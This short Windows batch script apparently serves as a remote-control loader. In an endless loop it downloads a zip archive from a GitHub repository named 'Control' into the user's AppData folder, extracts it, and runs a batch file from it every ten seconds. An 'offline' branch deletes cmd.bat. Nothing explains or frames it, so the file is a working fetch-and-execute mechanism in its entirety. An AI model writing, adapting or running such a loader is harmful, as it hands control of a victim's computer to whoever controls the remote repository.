cd C:\users\%username%\AppData
powershell Import-Module BitsTransfer
:begin
powershell Start-BitsTransfer -source "https://github.com/Guest257351/Control/archive/refs/heads/main.zip" -Destination data.zip
powershell Expand-Archive data.zip C:\users\%username%\AppData\scripts
cd C:\Users\%username%\AppData\scripts\Control-main
timeout 1 /NOBREAK >nul
call REPtxt.bat
timeout 10 /NOBREAK >nul
goto begin
:offline
del cmd.bat
timeout 10 /NOBREAK >nul
goto begin